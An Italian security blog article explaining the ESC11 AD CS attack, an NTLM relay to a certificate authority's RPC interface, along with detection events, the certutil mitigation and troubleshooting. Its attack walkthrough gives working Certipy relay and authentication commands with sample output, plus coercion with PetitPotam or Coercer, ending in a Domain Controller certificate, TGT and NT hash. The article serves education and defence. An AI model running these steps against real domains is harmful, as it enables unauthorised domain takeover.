---
title: 'ESC11 AD CS: NTLM Relay RPC, Certipy & Privilege Escalation'
slug: esc11-adcs
description: 'Una CA vulnerabile a ESC11 può accettare NTLM relay via RPC. Come riconoscere la configurazione, privesc, valutare l’impatto sui certificati e bloccare l’abuso.'
image: /BCO.69cae626-2e95-48f7-8cbd-824dad0ae6f0.webp
draft: false
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC11
  - Active Directory
  - AD CS
  - NTLM Relay
  - Certipy
---

# ESC11 in Active Directory Certificate Services: NTLM relay verso l'interfaccia RPC della CA

ESC11 è una tecnica di **privilege escalation via AD CS** che sfrutta un **NTLM relay verso l'interfaccia RPC della Certificate Authority**. A differenza di [ESC8](/articoli/esc8-adcs/), che colpisce l'endpoint web `/certsrv/`, ESC11 prende di mira direttamente l'interfaccia **RPC** usata dai client per richiedere certificati — niente browser, niente HTTP, solo RPC.

Prima di entrare nel dettaglio, un glossario: se è la prima volta che leggi questi termini, eccoli in una riga ciascuno.

| Termine                                   | Cos'è, in una riga                                                                                                                                                                                                                                           |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **AD CS**                                 | Active Directory Certificate Services: il servizio Windows che emette certificati digitali nel dominio.                                                                                                                                                      |
| **RPC**                                   | Remote Procedure Call: il protocollo con cui un computer chiede a un altro di eseguire un'operazione da remoto — qui è il canale usato per richiedere certificati alla CA, invece del web.                                                                   |
| **ICPR (MS-ICPR)**                        | ICertPassage Remote: il protocollo RPC specifico con cui i client chiedono certificati alla CA.                                                                                                                                                              |
| **NTLM**                                  | Un protocollo di autenticazione Windows più vecchio di Kerberos, basato su uno scambio di sfide crittografiche legato alla password dell'account.                                                                                                            |
| **NTLM Relay**                            | Un attacco in cui l'attaccante non ruba la password, ma si mette "in mezzo": intercetta un tentativo di autenticazione NTLM di qualcun altro e lo inoltra (relay) a un servizio terzo, autenticandosi *come quella vittima* senza conoscerne le credenziali. |
| **Coercion (coercizione)**                | Una tecnica che costringe una macchina (tipicamente un Domain Controller) ad autenticarsi verso un host scelto dall'attaccante — è il passo che "genera" l'autenticazione NTLM da inoltrare col relay. PetitPotam e Coercer sono i tool più usati.           |
| **Authentication Level / Packet Privacy** | Il livello di protezione crittografica di una connessione RPC. "Packet Privacy" (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) significa che il traffico RPC è cifrato — se manca, la connessione può essere intercettata/relayata.                                       |
| **Certificate template**                  | Il "modello" che definisce cosa può ottenere chi richiede un certificato (a chi è aperto, cosa può contenere).                                                                                                                                               |
| **Template DomainController**             | Il template standard con cui gli account macchina dei DC richiedono il proprio certificato — è il bersaglio tipico di ESC11 perché un DC si autentica spesso in automatico se "chiamato".                                                                    |
| **TGT**                                   | Ticket Granting Ticket: il "biglietto" Kerberos che prova la tua identità e ti permette di chiedere accesso ad altri servizi del dominio.                                                                                                                    |
| **NT hash**                               | La rappresentazione cifrata della password di un account in Windows: con quella puoi autenticarti ovunque NTLM sia accettato, senza conoscere la password in chiaro.                                                                                         |

***

# In cosa consiste il problema

Quando un client richiede un certificato via RPC, la CA dovrebbe esigere che quella connessione RPC sia protetta a livello **packet privacy** (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`), cioè cifrata. Questo requisito è governato da un flag nel registro della CA:

```text
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\InterfaceFlags
```

Il flag in questione è:

```
IF_ENFORCEENCRYPTICERTREQUEST
```

**Punto importante che spesso si dà per scontato:** questo flag è **attivo di default** su Windows Server 2012 e versioni successive. ESC11 non è quindi "la configurazione normale lasciata insicura" — è una condizione che qualcuno ha **disattivato esplicitamente**, tipicamente per mantenere compatibilità con client legacy (es. Windows XP) che non supportano il livello di cifratura richiesto. Vale la pena saperlo sia per non sopravvalutare quanto sia diffuso, sia perché la sua presenza è spesso un segnale di debito tecnico reale nell'ambiente.

Se il flag è disattivato, la CA accetta richieste RPC non cifrate, e questo apre la porta al relay: un attaccante può intercettare l'autenticazione NTLM di un account (tipicamente un Domain Controller) e inoltrarla alla CA, ottenendo un certificato valido per quell'account senza conoscerne la password.

***

# Identificazione con Certipy

Certipy rileva ESC11 verificando se la CA richiede packet privacy sulle richieste RPC:

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Authorities

CA Name : CORP-CA
DNS Name : CA.CORP.LOCAL

Request Disposition : Issue
Enforce Encryption for Requests : Disabled

[!] Vulnerabilities
  ESC11 : Encryption is not enforced for ICPR (RPC) requests
```

Indicatori chiave:

* `Enforce Encryption for Requests : Disabled`
* `[!] Vulnerabilities ESC11`

> Nota: `Request Disposition: Issue` dice che *quella configurazione specifica* emette i certificati automaticamente — non è una garanzia valida per ogni CA. Verifica sempre l'output sul target reale, non dare per scontato che valga ovunque.

***

# Exploitation ESC11

L'attacco segue la stessa logica di ESC8, ma passa per RPC invece che per HTTP. In pratica servono due ingredienti che da soli non bastano l'uno senza l'altro:

1. un **relay** in ascolto, pronto a inoltrare un'autenticazione NTLM verso la CA via RPC;
2. una **coercion** che costringa un account con diritti sufficienti (tipicamente il computer account di un Domain Controller) ad autenticarsi verso il relay.

Non basta "lanciare la coercion": serve anche che la CA sia raggiungibile via RPC dall'host del relay, che la richiesta di certificato venga effettivamente accettata e che il certificato ottenuto sia utilizzabile per l'autenticazione (template giusto, emissione consentita). E non serve conoscere nessuna credenziale in anticipo — è proprio il punto di forza di questo attacco lato offensivo: zero credenziali, solo capacità di far autenticare la vittima verso di te.

***

## Step 1 — Avvia il relay verso l'interfaccia RPC

```bash
certipy relay \
-target 'rpc://10.0.0.50' -ca 'CORP-CA' \
-template 'DomainController'
```

Output iniziale:

```
Targeting rpc://10.0.0.50 (ESC11)
Listening on 0.0.0.0:445
Setting up SMB Server on port 445
```

Certipy apre un server SMB (porta 445) per ricevere l'autenticazione NTLM in arrivo, e la gira verso l'interfaccia RPC della CA.

Se sei su Linux e la porta 445 risulta già riservata/non bindabile senza privilegi, **non** modificare una configurazione globale del sistema per aggirarlo — comandi come abbassare `ip_unprivileged_port_start` a 0 rendono bindabili senza privilegi *tutte* le porte storicamente riservate, non solo la 445, e restano attivi oltre il laboratorio. In un ambiente di test è più pulito dare al processo i permessi necessari (es. una capability dedicata) piuttosto che abbassare quella soglia globalmente.

***

## Step 2 — Forzare l'autenticazione NTLM (coercion)

Qui entra la parte "lato SpecterOps": il relay da solo non serve a niente se nessuno si autentica verso di esso. Serve forzare un account privilegiato — di solito il computer account del Domain Controller — ad autenticarsi verso l'host che controlli.

Tool comuni per la coercion:

* **PetitPotam** — abusa l'interfaccia EFSRPC per costringere un host a connettersi a un indirizzo a scelta;
* **Coercer** — automatizza diverse tecniche di coercion (incluse varianti come DFSCoerce, ShadowCoerce) provando più protocolli finché una funziona.

Il motivo per cui si punta quasi sempre al Domain Controller: il suo computer account (`DC$`) ha permessi elevati nel dominio, e un certificato valido per `DC$` porta dritto a un TGT utilizzabile per autenticazioni successive con privilegi molto alti (incluso, a valle, l'accesso in stile DCSync).

***

## Step 3 — Relay e richiesta del certificato

Quando l'autenticazione arriva, Certipy la inoltra alla CA via RPC e richiede il certificato al posto della vittima.

Output tipico:

```
Received connection from 10.0.0.100
Authenticating against rpc://10.0.0.50 as CORP/DC$ SUCCEED

Requesting certificate for user 'DC$' with template 'DomainController'

Request ID is 1
Successfully requested certificate
Got certificate with DNS Host Name 'DC.CORP.LOCAL'

Saving certificate and private key to 'dc.pfx'
```

L'attaccante ora possiede `dc.pfx`: un certificato valido per il Domain Controller, ottenuto senza mai conoscerne una password.

Il template `DomainController` è pertinente quando a essere relayato è un **computer account** (finisce con `$`); per un utente privilegiato relayato servirebbe un template diverso, adatto a un account utente e comunque richiedibile dal contesto autenticato.

***

# Autenticazione con il certificato

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
```

Output:

```
Got TGT
Saving credential cache to dc.ccache
Got hash for dc$
```

Risultato:

* **Kerberos TGT** per l'account relayato
* **NT hash** dell'account
* da qui, in pratica, compromissione del dominio

***

# Detection ESC11

Al di là dell'enumerazione con Certipy, per ricostruire un abuso già avvenuto servono i log della CA correlati tra loro:

| Evento Windows sulla CA | Cosa indica                                                    |
| ----------------------- | -------------------------------------------------------------- |
| `4886`                  | Richiesta di certificato ricevuta                              |
| `4887`                  | Certificato approvato ed emesso                                |
| `4888`                  | Richiesta di certificato negata                                |
| `4891`                  | Modifica di una voce di configurazione di Certificate Services |
| `4892`                  | Modifica di una proprietà di Certificate Services              |

Gli eventi `4886`/`4887` sono utili soprattutto se correlati tramite Request ID, richiedente e certificato emesso — da soli dicono poco. La loro disponibilità dipende dall'auditing configurato correttamente e dalla raccolta centralizzata dei log, non è garantita di default.

Altri segnali da incrociare, mai da soli conclusivi:

* autenticazioni NTLM ricevute dalla CA fuori dal pattern abituale;
* connessioni SMB insolite verso host che non dovrebbero riceverne;
* modifiche recenti al flag `InterfaceFlags`.

***

# Mitigation ESC11

La mitigazione diretta è forzare la cifratura sulle richieste RPC:

```cmd
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc
net start certsvc
```

Questo impone `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` su tutte le richieste RPC verso la CA, rendendo il relay impraticabile.

Da tenere presente prima di applicarla in produzione: può rompere la compatibilità con client legacy che non supportano quel livello di autenticazione — è spesso proprio per questo che il flag viene disattivato in ambienti con infrastruttura datata. Testala in un ambiente controllato prima di estenderla.

Misure complementari, non sostitutive:

* limitare NTLM dove possibile (policy di restrizione NTLM);
* contenere traffico SMB/RPC non necessario verso la CA;
* verificare periodicamente che la configurazione resti attiva dopo update o modifiche amministrative — non è raro che venga disattivata di nuovo per "risolvere" un problema di compatibilità futuro.

Un chiarimento utile: EPA/Channel Binding (le protezioni usate contro il relay su HTTP/HTTPS, rilevanti per ESC8) **non** sostituiscono questo requisito — riguardano un canale diverso (web enrollment), non l'interfaccia RPC.

***

# Troubleshooting

Casi comuni in cui l'attacco non va a buon fine, e cosa controllare:

* **il relay non riceve nessuna autenticazione** → la coercion non sta funzionando: verifica che l'host target sia raggiungibile, che il protocollo scelto da PetitPotam/Coercer non sia bloccato, e che non ci sia un firewall tra vittima e relay;
* **l'autenticazione RPC viene rifiutata** → la CA probabilmente ha già `IF_ENFORCEENCRYPTICERTREQUEST` attivo: non è vulnerabile a questa tecnica;
* **la richiesta di certificato viene negata o resta in attesa** → il template usato non è richiedibile dall'account relayato, o richiede approvazione manuale;
* **il certificato viene ottenuto ma l'autenticazione fallisce** → verifica la catena di trust del certificato e che l'account relayato sia davvero quello che ti aspetti (controlla l'output del relay).

Ognuno di questi sintomi ha più cause possibili: non trattarli come diagnosi automatiche, sono solo un punto di partenza.

***

# ESC8 vs ESC11, in breve

|                          | ESC8                                        | ESC11                                                |
| ------------------------ | ------------------------------------------- | ---------------------------------------------------- |
| Interfaccia colpita      | Web Enrollment HTTP(S) (`/certsrv/`)        | Interfaccia RPC (MS-ICPR)                            |
| Protezione da verificare | EPA / Channel Binding su IIS                | `IF_ENFORCEENCRYPTICERTREQUEST` (RPC packet privacy) |
| Stato di default         | Spesso disattivata su configurazioni datate | Attiva di default dal 2012 in poi                    |

***

# FAQ — ESC11 ADCS

### Cos'è ESC11?

Un attacco di **NTLM relay verso l'interfaccia RPC** della Certificate Authority, possibile quando la CA non impone cifratura sulle richieste RPC.

### ESC11 è simile a ESC8?

Sì nella logica (relay verso AD CS), ma [ESC8](/articoli/esc8-adcs/) colpisce l'endpoint web `/certsrv/`, mentre ESC11 colpisce l'interfaccia RPC/MS-ICPR.

### ESC11 permette di arrivare a Domain Admin?

Può essere un passo importante verso quell'obiettivo se viene relayato un computer account privilegiato come il Domain Controller, ma da solo dà un certificato per quell'account — cosa ci fai dopo dipende dai permessi reali di quell'identità nel dominio.

### Serve accesso iniziale al dominio per fare ESC11?

Non servono credenziali valide, ma serve comunque una tecnica di coercion funzionante e un percorso di rete che permetta sia la coercion sia il relay verso la CA — non è "gratis" solo perché non serve una password.

***

ESC11 è una delle tecniche AD CS dove il problema non è un certificate template mal configurato, ma la mancanza di una protezione di trasporto sulla CA stessa. Per il quadro completo delle escalation vedi la [guida ESC1-ESC16](/articoli/adcs-esc1-esc16/).

Tool usato in questa guida: [Certipy](https://github.com/ly4k/Certipy).
